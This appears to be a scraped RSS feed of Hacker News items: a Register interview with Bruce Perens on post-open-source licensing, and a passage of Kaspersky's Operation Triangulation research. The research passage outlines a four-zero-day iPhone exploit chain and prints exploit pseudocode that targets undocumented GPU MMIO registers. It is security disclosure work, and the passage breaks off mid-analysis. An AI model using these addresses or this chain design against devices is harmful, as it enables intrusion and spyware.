title="Permalink"></a></h2><ul><li>The <code>@pure</code> macro is now deprecated. Use <code>Base.@assume_effects :foldable</code> instead (<a href="https://github.com/JuliaLang/julia/issues/48682">#48682</a>).</li></ul></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Apple wins bid to pause Apple Watch ban at US appeals court (115 pts)]]></title>
            <link>https://www.reuters.com/legal/apple-wins-bid-pause-apple-watch-ban-us-appeals-court-2023-12-27/</link>
            <guid>38783718</guid>
            <pubDate>Wed, 27 Dec 2023 16:43:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.reuters.com/legal/apple-wins-bid-pause-apple-watch-ban-us-appeals-court-2023-12-27/">https://www.reuters.com/legal/apple-wins-bid-pause-apple-watch-ban-us-appeals-court-2023-12-27/</a>, See on <a href="https://news.ycombinator.com/item?id=38783718">Hacker News</a></p>
Couldn't get https://www.reuters.com/legal/apple-wins-bid-pause-apple-watch-ban-us-appeals-court-2023-12-27/: Error: Request failed with status code 401]]></description>
        </item>
        <item>
            <title><![CDATA[What comes after open source? Bruce Perens is working on it (121 pts)]]></title>
            <link>https://www.theregister.com/2023/12/27/bruce_perens_post_open/</link>
            <guid>38783500</guid>
            <pubDate>Wed, 27 Dec 2023 16:25:33 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theregister.com/2023/12/27/bruce_perens_post_open/">https://www.theregister.com/2023/12/27/bruce_perens_post_open/</a>, See on <a href="https://news.ycombinator.com/item?id=38783500">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="body">
<p><span>Interview</span> Bruce Perens, one of the founders of the Open Source movement, is ready for what comes next: the Post-Open Source movement.</p>
<p>"I've written papers about it, and I've tried to put together a prototype license," Perens explains in an interview with <em>The Register</em>. "Obviously, I need help from a lawyer. And then the next step is to go for grant money."</p>
<p>Perens says there are several pressing problems that the open source community needs to address.</p>
<blockquote>

<p>I feel that IBM has gotten everything it wants from the open source developer community now, and we've received something of a middle finger from them...</p>
</blockquote>
<p>"First of all, our licenses aren't working anymore," he said. "We've had enough time that businesses have found all of the loopholes and thus we need to do something new. The GPL is not acting the way the GPL should have done when one-third of all paid-for Linux systems are sold with a GPL circumvention. That's RHEL."</p>
<p>RHEL stands for Red Hat Enterprise Linux, which in June, under IBM's ownership, <a target="_blank" href="https://www.theregister.com/2023/06/23/red_hat_centos_move/">stopped making its source code available</a> as required under the GPL.</p>

    

<p>Perens recently returned from a trip to China, where he was the keynote speaker at the Bench 2023 conference. In anticipation of his conversation with <em>El Reg</em>, he wrote up some thoughts on his visit and on the state of the open source software community.</p>

        


        

<p>One of the matters that came to mind was Red Hat.</p>
<div><p><img src="https://regmedia.co.uk/2023/06/23/ibmredhat.jpg?x=174&amp;amp;y=115&amp;amp;crop=1" width="174" height="115" alt="IBMredhat"></p><h2 title="From now on, only CentOS Stream's source code is available to all">Red Hat strikes a crushing blow against RHEL downstreams</h2>
<p><a href="https://www.theregister.com/2023/06/23/red_hat_centos_move/"><span>READ MORE</span></a></p></div>
<p>"They aren't really Red Hat any longer, they're IBM," Perens writes in the note he shared with <em>The Register</em>. "And of course they stopped distributing CentOS, and for a long time they've done something that I feel violates the GPL, and <a target="_blank" href="https://www.theregister.com/2020/03/27/grsecurity_bruce_perens_gpl_settlement/">my defamation case</a> was about another company doing the exact same thing: They tell you that if you are a RHEL customer, you can't disclose the GPL source for security patches that RHEL makes, because they won't allow you to be a customer any longer. IBM employees assert that they are still feeding patches to the upstream open source project, but of course they aren't required to do so.</p>
<p>"This has gone on for a long time, and only the fact that Red Hat made a public distribution of CentOS (essentially an unbranded version of RHEL) made it tolerable. Now IBM isn't doing that any longer. So I feel that IBM has gotten everything it wants from the open source developer community now, and we've received something of a middle finger from them.</p>
<p>"Obviously CentOS was important to companies as well, and they are running for the wings in adopting Rocky Linux. I could wish they went to a Debian derivative, but OK. But we have a number of straws on the Open Source camel's back. Will one break it?"</p>

        

<p>Another straw burdening the Open Source camel, Perens writes, "is that Open Source has completely failed to serve the common person. For the most part, if they use us at all they do so through a proprietary software company's systems, like Apple iOS or Google Android, both of which use Open Source for infrastructure but the apps are mostly proprietary. The common person doesn't know about Open Source, they don't know about the freedoms we promote which are increasingly in their interest. Indeed, Open Source is used today to surveil and even oppress them."</p>
<p>Free Software, Perens explains, is now 50 years old and the first announcement of Open Source occurred 30 years ago. "Isn't it time for us to take a look at what we've been doing, and see if we can do better? Well, yes, but we need to preserve Open Source at the same time. Open Source will continue to exist and provide the same rules and paradigm, and the thing that comes after Open Source should be called something else and should never try to pass itself off as Open Source. So far, I call it Post-Open."</p>
<p>Post-Open, as he describes it, is a bit more involved than Open Source. It would define the corporate relationship with developers to ensure companies paid a fair amount for the benefits they receive. It would remain free for individuals and non-profit, and would entail just one license.</p>

        

<p>He imagines a simple yearly compliance process that gets companies all the rights they need to use Post-Open software. And they'd fund developers who would be encouraged to write software that's usable by the common person, as opposed to technical experts.</p>
<p>Pointing to popular applications from Apple, Google, and Microsoft, Perens says: "A lot of the software is oriented toward the customer being the product – they're certainly surveilled a great deal, and in some cases are actually abused. So it's a good time for open source to actually do stuff for normal people."</p>
<p>The reason that doesn't often happen today, says Perens, is that open source developers tend to write code for themselves and those who are similarly adept with technology. The way to avoid that, he argues, is to pay developers, so they have support to take the time to make user-friendly applications.</p>
<p>Companies, he suggests, would foot the bill, which could be apportioned to contributing developers using the sort of software that instruments GitHub and shows who contributes what to which products. <a target="_blank" rel="nofollow" href="https://www.merico.dev/">Merico</a>, he says, is a company that provides such software.</p>
<p>Perens acknowledges that a lot of stumbling blocks need to be overcome, like finding an acceptable entity to handle the measurements and distribution of funds. What's more, the financial arrangements have to appeal to enough developers.</p>
<p>"And all of this has to be transparent and adjustable enough that it doesn't fork 100 different ways," he muses. "So, you know, that's one of my big questions. Can this really happen?"</p>
<ul>

<li><a href="https://www.theregister.com/2023/09/20/gnu_turns_40/">GNU turns 40: Stallman's baby still not ready for prime time, but hey, there's cake</a></li>

<li><a href="https://www.theregister.com/2023/07/10/oracle_ibm_rhel_code/">Oracle pours fuel all over Red Hat source code drama</a></li>

<li><a href="https://www.theregister.com/2023/04/17/rust_foundation_apologizes_trademark_policy/">Rust Foundation so sorry for scaring the C out of you with trademark crackdown talk</a></li>

<li><a href="https://www.theregister.com/2022/11/16/sourceware_open_source_openssf/">Open source community split over offer of 'corporate' welfare for critical dev tools</a></li>
</ul>
<p>Whether it can or not, Perens argues that the GPL isn't enough. "The GPL is designed not as a contract but as a license. What Richard Stallman was thinking was he didn't want to take away anyone's rights. He only wanted to grant rights. So it's not a contract. It's a license. Well, we can't do that anymore. We need enforceable contract terms."</p>
<p>Asked whether the adoption of non-Open Source licenses, by the likes of <a target="_blank" href="https://www.theregister.com/2023/08/11/hashicorp_bsl_licence/">HashiCorp</a>, <a target="_blank" href="https://www.theregister.com/2021/01/18/elastics_doubling_down_on_open/">Elastic</a>, <a target="_blank" href="https://www.theregister.com/2022/03/17/court_open_source/">Neo4j</a>, and <a target="_blank" href="https://www.theregister.com/2018/10/16/mongodb_licensning_change/">MongoDB</a>, represent a viable way forward, Perens says new thinking is needed.</p>
<p>He's not a fan of licenses like the Commons Clause, which is at the center of <a target="_blank" href="https://www.theregister.com/2023/02/12/software_freedom_conservancy_fights_agplv3/">a legal battle involving Neo4j</a>.</p>
<p>"Why is the Commons Clause bad?" he writes. "First, there's the Brand Problem. Open Source licenses have a 'brand' which is the understanding of the rights they convey, and of course Open Source has a brand too, which is the understanding of the rights in the Open Source Definition. The Commons Clause appears to use the Open Source license, but doesn't give the same rights at all, thus abusing the license brand for profit.</p>
<p>"The other problem is that the Commons Clause is added to licenses that don't actually allow terms to be added, like the AGPL 3 on Neo4J. AGPL and GPL have two paragraphs that both disallow the addition of terms. So, when a licensor adds the Commons Clause, they create a license with self-contradictory legal language."</p>
<p>"We've been working on the [software-as-a-service] problem for quite a long time," Perens tells <em>The Register</em>. "I remember attending a [Free Software Foundation] meeting, where the question was, 'what do we do about Google?' And the AGPL came out of that meeting."</p>
<p>Perens doesn't think the AGPL or various non-Open Source licenses focus on the right issue in the context of cloud companies.</p>
<blockquote>

<p>I think that AI is always plagiarism... When you train the model, you're training the model with other people's copyrighted stuff...</p>
</blockquote>
<p>"So AGPL, for example, makes software disclose its own source code in some way," he says. "What we're actually talking about is public performance in software, and public performance is a separate right under copyright, because it was necessary for plays and films. So we have that right under copyright and we can use it. I think those licenses are all sort of trying to reach a goal and are getting partially there because they only tried to make slight changes from open source. And, you know, it's 30 years that we've had open source. We can consider a radical departure."</p>
<p>Asked about the current enthusiasm for the tech which the industry refers to as "AI," Perens expresses disapproval.</p>
<p>"I think that AI is always plagiarism," he says. "When you train the model, you're training the model with other people's copyrighted stuff. And what the AI does is mix and match and output a combination of what was input. We have to consider that. How do we compensate the people whose data was used to train the model? Should we be training it with open source software? I don't think so. But it does more than that. It reads people's websites. It reads the whole of Wikipedia. Nobody on the input side is being compensated fairly for the output. So that's a big question we have to resolve."</p>
<p>As to whether US efforts to withhold technology from China are working, Perens said they have been largely ineffective.</p>
<p>"The Chinese can do, with one or two exceptions that will fall soon enough, everything that we do," he says, noting that while they're behind on advanced chips, they'll catch up. He says he came away from his trip surprised by how similar the people in the US and China are, both in terms of the way people live their lives and in their disinterest in the geopolitical posturing in the South China Sea that adds tension to the US-China relationship.</p>
<p>Maintaining some degree of civility with China also has implications for the open source community due to US export laws, specifically, ITAR, the International Traffic in Arms Restrictions, administered by the Department of State, and EAR, the Export Administration Regulations, overseen by the Department of Commerce.</p>
<p>"Now, space satellites and digital voice CODECs, and some uses of Kraken RF project, and probably hundreds of other Open Source projects, are still on the list of restricted technologies," Perens explains. "As a result of several lawsuits, both ITAR and EAR got carve-outs for 'information in the public domain.' This doesn't mean 'public-domain software,' which is a matter of copyright. It means 'not trade-secret.' So it applies to Open Source and published research.</p>
<p>"Today, a project that is <em>completely</em> disclosed can be operated without restriction under ITAR and EAR. Open Research Institute, a while ago, did the work to get such a project explicitly approved by the Department of State and Department of Commerce. So it's currently possible to run an Open Source project for what might otherwise be a 'munitions' technology, including with nations that would otherwise be restricted under ITAR and EAR. This is something important for us to protect, both for Open Source and for public research. It is always under threat as US politicians are increasingly concerned with such things as 3D-printed guns and many of them want to be more restrictive of technology sharing with China, etc."</p>
<p>"I think that it's very scary that potentially we have strife with this country," says Perens. "But if you look at the people, the people are so much like us today. We really should be having peace together." ®</p>                                
                    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Operation Triangulation: What You Get When Attack iPhones of Researchers (372 pts)]]></title>
            <link>https://securelist.com/operation-triangulation-the-last-hardware-mystery/111669/</link>
            <guid>38783112</guid>
            <pubDate>Wed, 27 Dec 2023 15:47:55 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://securelist.com/operation-triangulation-the-last-hardware-mystery/111669/">https://securelist.com/operation-triangulation-the-last-hardware-mystery/111669/</a>, See on <a href="https://news.ycombinator.com/item?id=38783112">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
	
			<div>
					<article>
						<header>
							<figure>
								<img width="800" height="450" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-800x450.jpg" alt="" decoding="async" fetchpriority="high" srcset="" sizes="(max-width: 800px) 100vw, 800px" data-src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-800x450.jpg" data-srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-800x450.jpg 800w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-300x169.jpg 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-1024x576.jpg 1024w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-768x432.jpg 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-622x350.jpg 622w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-740x416.jpg 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-498x280.jpg 498w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware.jpg 1200w">							</figure>
														<p>
								<a href="https://securelist.com/category/research/">Research</a>
							</p>
																					<div>
																<p>
									<a href="https://securelist.com/category/research/">Research</a>
								</p>
																<p><time datetime="2023-12-27T14:00:43+00:00">27 Dec 2023</time></p>
								<p>
									<svg><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://securelist.com/wp-content/themes/securelist2020/assets/sprite/icons.svg#icon-hourglass"></use></svg> <span></span> minute read								</p>
							</div>
						</header>

						<div>
									<div>
										<div>
											<figure>
												<img width="1200" height="600" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-1200x600.jpg" alt="" decoding="async" loading="lazy" data-src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/27120730/sl-featured_Triangulation-hardware-1200x600.jpg" data-srcset="" srcset="">											</figure>

											

											
											<div>
													<p>Today, on December 27, 2023, we (<a href="https://twitter.com/oct0xor" target="_blank" rel="noopener">Boris Larin</a>, <a href="https://twitter.com/bzvr_" target="_blank" rel="noopener">Leonid Bezvershenko</a>, and <a href="https://twitter.com/kucher1n" target="_blank" rel="noopener">Georgy Kucherin</a>) delivered a presentation, titled, “Operation Triangulation: What You Get When Attack iPhones of Researchers”, at the 37th Chaos Communication Congress (37C3), held at Congress Center Hamburg. The presentation summarized the results of our long-term research into Operation Triangulation, conducted with our colleagues, <a href="https://twitter.com/2igosha" target="_blank" rel="noopener">Igor Kuznetsov</a>, <a href="https://securelist.com/author/valentinpashkov/" target="_blank" rel="noopener">Valentin Pashkov</a>, and <a href="https://securelist.com/author/mikhailvinogradov/" rel="noopener" target="_blank">Mikhail Vinogradov</a>.</p>
<p>This presentation was also the first time we had publicly disclosed the details of all exploits and vulnerabilities that were used in the attack. We discover and analyze new exploits and attacks using these on a daily basis, and we have discovered and reported more than thirty in-the-wild zero-days in Adobe, Apple, Google, and Microsoft products, but this is definitely the most sophisticated attack chain we have ever seen.</p>
<h2 id="operation-triangulation-attack-chain">Operation Triangulation’ attack chain</h2>
<p>Here is a quick rundown of this 0-click iMessage attack, which used four zero-days and was designed to work on iOS versions up to iOS 16.2.</p>
<ul>
<li>Attackers send a malicious iMessage attachment, which the application processes without showing any signs to the user.</li>
<li>This attachment exploits the remote code execution vulnerability <a href="https://support.apple.com/en-us/HT213842" target="_blank" rel="noopener">CVE-2023-41990</a> in the undocumented, Apple-only ADJUST TrueType font instruction. This instruction had existed since the early nineties before a patch removed it.</li>
<li>It uses return/jump oriented programming and multiple stages written in the NSExpression/NSPredicate query language, patching the JavaScriptCore library environment to execute a privilege escalation exploit written in JavaScript.</li>
<li>This JavaScript exploit is obfuscated to make it completely unreadable and to minimize its size. Still, it has around 11,000 lines of code, which are mainly dedicated to JavaScriptCore and kernel memory parsing and manipulation.</li>
<li>It exploits the JavaScriptCore debugging feature DollarVM ($vm) to gain the ability to manipulate JavaScriptCore’s memory from the script and execute native API functions.</li>
<li>It was designed to support both old and new iPhones and included a Pointer Authentication Code (PAC) bypass for exploitation of recent models.</li>
<li>It uses the integer overflow vulnerability <a href="https://support.apple.com/en-us/103837" target="_blank" rel="noopener">CVE-2023-32434</a> in XNU’s memory mapping syscalls (mach_make_memory_entry and vm_map) to obtain read/write access to the entire physical memory of the device at user level.</li>
<li>It uses hardware memory-mapped I/O (MMIO) registers to bypass the Page Protection Layer (PPL). This was mitigated as <a href="https://support.apple.com/en-us/HT213841" target="_blank" rel="noopener">CVE-2023-38606</a>.</li>
<li>After exploiting all the vulnerabilities, the JavaScript exploit can do whatever it wants to the device including running spyware, but the attackers chose to: (a) launch the IMAgent process and inject a payload that clears the exploitation artefacts from the device; (b) run a Safari process in invisible mode and forward it to a web page with the next stage.</li>
<li>The web page has a script that verifies the victim and, if the checks pass, receives the next stage: the Safari exploit.</li>
<li>The Safari exploit uses <a href="https://support.apple.com/en-us/HT213676" target="_blank" rel="noopener">CVE-2023-32435</a> to execute a shellcode.</li>
<li>The shellcode executes another kernel exploit in the form of a Mach object file. It uses the same vulnerabilities: <a href="https://support.apple.com/en-us/103837" target="_blank" rel="noopener">CVE-2023-32434</a> and <a href="https://support.apple.com/en-us/HT213841" target="_blank" rel="noopener">CVE-2023-38606</a>. It is also massive in terms of size and functionality, but completely different from the kernel exploit written in JavaScript. Certain parts related to exploitation of the above-mentioned vulnerabilities are all that the two share. Still, most of its code is also dedicated to parsing and manipulation of the kernel memory. It contains various post-exploitation utilities, which are mostly unused.</li>
<li>The exploit obtains root privileges and proceeds to execute other stages, which load spyware. We covered these stages in our previous <a href="https://securelist.com/trng-2023/" target="_blank" rel="noopener">posts</a>.</li>
</ul>
<p>We are almost done reverse-engineering every aspect of this attack chain, and we will be releasing a series of articles next year detailing each vulnerability and how it was exploited.</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130925/trng_final_mystery_en_01.png"><img loading="lazy" decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130925/trng_final_mystery_en_01.png" alt="" width="1920" height="1080" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130925/trng_final_mystery_en_01.png 1920w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130925/trng_final_mystery_en_01-300x169.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130925/trng_final_mystery_en_01-1024x576.png 1024w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130925/trng_final_mystery_en_01-768x432.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130925/trng_final_mystery_en_01-1536x864.png 1536w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130925/trng_final_mystery_en_01-800x450.png 800w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130925/trng_final_mystery_en_01-622x350.png 622w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130925/trng_final_mystery_en_01-740x416.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130925/trng_final_mystery_en_01-498x280.png 498w" sizes="(max-width: 1920px) 100vw, 1920px"></a></p>
<p>However, there are certain aspects to one particular vulnerability that we have not been able to fully understand. </p>
<h2 id="the-mystery-and-the-cve-2023-38606-vulnerability">The mystery and the CVE-2023-38606 vulnerability</h2>
<p>What we want to discuss is related to the vulnerability that has been mitigated as <a href="https://support.apple.com/en-us/HT213841" target="_blank" rel="noopener">CVE-2023-38606</a>. Recent iPhone models have additional hardware-based security <a href="https://support.apple.com/guide/security/operating-system-integrity-sec8b776536b/web" target="_blank" rel="noopener">protection</a> for sensitive regions of the kernel memory. This protection prevents attackers from obtaining full control over the device if they can read and write kernel memory, as achieved in this attack by exploiting <a href="https://support.apple.com/en-us/103837" target="_blank" rel="noopener">CVE-2023-32434</a>. We discovered that to bypass this hardware-based security protection, the attackers used another hardware feature of Apple-designed <a href="https://en.wikipedia.org/wiki/System_on_a_chip" target="_blank" rel="noopener">SoCs</a>.</p>
<p>If we try to describe this feature and how the attackers took advantage of it, it all comes down to this: they are able to write data to a certain physical address while bypassing the hardware-based memory protection by writing the data, destination address, and data hash to unknown hardware registers of the chip unused by the firmware.</p>
<p>Our guess is that this unknown hardware feature was most likely intended to be used for debugging or testing purposes by Apple engineers or the factory, or that it was included by mistake. Because this feature is not used by the firmware, we have no idea how attackers would know how to use it.</p>
<p>We are publishing the technical details, so that other iOS security researchers can confirm our findings and come up with possible explanations of how the attackers learned about this hardware feature.</p>
<h2 id="technical-details">Technical details</h2>
<p>Various peripheral devices available in the SoC may provide special hardware registers that can be used by the CPU to operate these devices. For this to work, these hardware registers are mapped to the memory accessible by the CPU and are known as “<a href="https://en.wikipedia.org/wiki/Memory-mapped_I/O_and_port-mapped_I/O" target="_blank" rel="noopener">memory-mapped I/O (MMIO)</a>“.</p>
<p>Address ranges for MMIOs of peripheral devices in Apple products (iPhones, Macs, and others) are stored in a special file format: <a href="https://www.theiphonewiki.com/wiki/DeviceTree" target="_blank" rel="noopener">DeviceTree</a>. Device tree files can be extracted from the firmware, and their contents can be viewed with the help of the <a href="https://github.com/Siguza/dt" target="_blank" rel="noopener">dt</a> utility.</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130932/trng_final_mystery_en_02.png"><img loading="lazy" decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130932/trng_final_mystery_en_02.png" alt="" width="657" height="201" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130932/trng_final_mystery_en_02.png 657w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130932/trng_final_mystery_en_02-300x92.png 300w" sizes="(max-width: 657px) 100vw, 657px"></a></p>
<p><em>Example of how MMIO ranges are stored in the device tree</em></p>
<p>For example, in this screenshot, you can see the start (0x210f00000) and the size (0x50000) of the acc-impl MMIO range for cpu0.</p>
<p>While analyzing the exploit used in the Operation Triangulation attack, I discovered that most of the MMIOs used by the attackers to bypass the hardware-based kernel memory protection do not belong to any MMIO ranges defined in the device tree. The exploit targets Apple A12–A16 Bionic SoCs, targeting unknown MMIO blocks of registers that are located at the following addresses: 0x206040000, 0x206140000, and 0x206150000.</p>
<p>The prompted me to try something. I checked different device tree files for different devices and different firmware files: no luck. I checked publicly available source code: no luck. I checked the kernel images, kernel extensions, iboot, and coprocessor firmware in search of a direct reference to these addresses: nothing.</p>
<p>How could it be that that the exploit used MMIOs that were not used by the firmware? How did the attackers find out about them? What peripheral device(s) do these MMIO addresses belong to?</p>
<p>It occurred to me that I should check what other known MMIOs were located in the area close to these unknown MMIO blocks. That approach was successful.</p>
<p>Let us take a look at a dump of the device tree entry for gfx-asc, which is the GPU coprocessor.</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130936/trng_final_mystery_en_03.png"><img loading="lazy" decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130936/trng_final_mystery_en_03.png" alt="" width="584" height="259" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130936/trng_final_mystery_en_03.png 584w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130936/trng_final_mystery_en_03-300x133.png 300w" sizes="(max-width: 584px) 100vw, 584px"></a></p>
<p><em>Dump of the device tree entry for gfx-asc</em></p>
<p>It has two MMIO ranges: 0x206400000–0x20646C000 and 0x206050000–0x206050008. Let us take a look at how they correlate with the regions used by the exploit.</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130944/trng_final_mystery_en_04.png"><img loading="lazy" decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130944/trng_final_mystery_en_04.png" alt="" width="1920" height="902" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130944/trng_final_mystery_en_04.png 1920w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130944/trng_final_mystery_en_04-300x141.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130944/trng_final_mystery_en_04-1024x481.png 1024w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130944/trng_final_mystery_en_04-768x361.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130944/trng_final_mystery_en_04-1536x722.png 1536w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130944/trng_final_mystery_en_04-745x350.png 745w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130944/trng_final_mystery_en_04-740x348.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130944/trng_final_mystery_en_04-596x280.png 596w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/12/25130944/trng_final_mystery_en_04-800x376.png 800w" sizes="(max-width: 1920px) 100vw, 1920px"></a></p>
<p><em>Correlation of the gfx-asc MMIO ranges and the addresses used by the exploit</em></p>
<p>To be more precise, the exploit uses the following unknown addresses: 0x206040000, 0x206140008, 0x206140108, 0x206150020, 0x206150040, and 0x206150048. We can see that most of these are located in the area between the two gfx-asc regions, and the remaining one is located close to the beginning of the first gfx-asc region. This suggested that all these MMIO registers most likely belonged to the GPU coprocessor!</p>
<p>After that, I took a closer look at the exploit and found one more thing that confirmed my theory. The first thing the exploit does during initialization is writing to some other MMIO register, which is located at a different address for each SoC.</p>
		<div id="crayon-658c436cedc7c865632623" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="show">
					<div><p>1</p><p>2</p><p>3</p><p>4</p><p>5</p><p>6</p><p>7</p><p>8</p><p>9</p><p>10</p><p>11</p><p>12</p><p>13</p><p>14</p><p>15</p><p>16</p><p>17</p><p>18</p><p>19</p><p>20</p><p>21</p><p>22</p><p>23</p><p>24</p><p>25</p></div>
				</td>
						<td><div><p><span>if</span><span> </span><span>(</span><span>cpuid</span><span> </span>==<span> </span><span>0x8765EDEA</span><span>)</span><span>:</span><span>&nbsp;&nbsp; </span><span># CPUFAMILY_ARM_EVEREST_SAWTOOTH (A16)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>base</span><span> </span>=<span> </span><span>0x23B700408</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>command</span><span> </span>=<span> </span><span>0x1F0023FF</span></p><p><span>elif</span><span> </span><span>(</span><span>cpuid</span><span> </span>==<span> </span><span>0xDA33D83D</span><span>)</span><span>:</span><span> </span><span># CPUFAMILY_ARM_AVALANCHE_BLIZZARD (A15)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>base</span><span> </span>=<span> </span><span>0x23B7003C8</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>command</span><span> </span>=<span> </span><span>0x1F0023FF</span></p><p><span>elif</span><span> </span><span>(</span><span>cpuid</span><span> </span>==<span> </span><span>0x1B588BB3</span><span>)</span><span>:</span><span> </span><span># CPUFAMILY_ARM_FIRESTORM_ICESTORM (A14)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>base</span><span> </span>=<span> </span><span>0x23B7003D0</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>command</span><span> </span>=<span> </span><span>0x1F0023FF</span></p><p><span>elif</span><span> </span><span>(</span><span>cpuid</span><span> </span>==<span> </span><span>0x462504D2</span><span>)</span><span>:</span><span> </span><span># CPUFAMILY_ARM_LIGHTNING_THUNDER (A13)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>base</span><span> </span>=<span> </span><span>0x23B080390</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>command</span><span> </span>=<span> </span><span>0x1F0003FF</span></p><p><span>elif</span><span> </span><span>(</span><span>cpuid</span><span> </span>==<span> </span><span>0x07D34B9F</span><span>)</span><span>:</span><span> </span><span># CPUFAMILY_ARM_VORTEX_TEMPEST (A12)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>base</span><span> </span>=<span> </span><span>0x23B080388</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>command</span><span> </span>=<span> </span><span>0x1F0003FF</span></p><p><span>if</span><span> </span><span>(</span><span>(</span><span>~</span><span>read_dword</span><span>(</span><span>base</span><span>)</span><span> </span>&amp;<span> </span><span>0xF</span><span>)</span><span> </span><span>!</span>=<span> </span><span>0</span><span>)</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>write_dword</span><span>(</span><span>base</span><span>,</span><span> </span><span>command</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>while</span><span>(</span><span>True</span><span>)</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>if</span><span> </span><span>(</span><span>(</span><span>~</span><span>read_dword</span><span>(</span><span>base</span><span>)</span><span> </span>&amp;<span> </span><span>0xF</span><span>)</span><span> </span>==<span> </span><span>0</span><span>)</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>break</span></p></div></td>
					</tr>
				</tbody></table>
			</div><p><em>Pseudocode for the GFX power manager control code from the exploit</em></p>
<p>With the help of the device tree and Siguza’s utility, <a href="https://github.com/Siguza/dt" target="_blank" rel="noopener">pmgr</a>, I was able to discover that all these addresses corresponded to the GFX register in the power manager MMIO range.</p>
<p>Finally, I obtained a third confirmation when I decided to try and access the registers located in these unknown regions. Almost instantly, the GPU coprocessor panicked with a message of, “GFX SERROR Exception class=0x2f (SError interrupt), IL=1, iss=0 – power(1)”.</p>
<p>This way, I was able to confirm that all these unknown MMIO registers used for the exploitation belonged to the GPU coprocessor. This motivated me to take a deeper look at its firmware, which is also written in ARM and unencrypted, but I could not find anything related to these registers in there.</p>
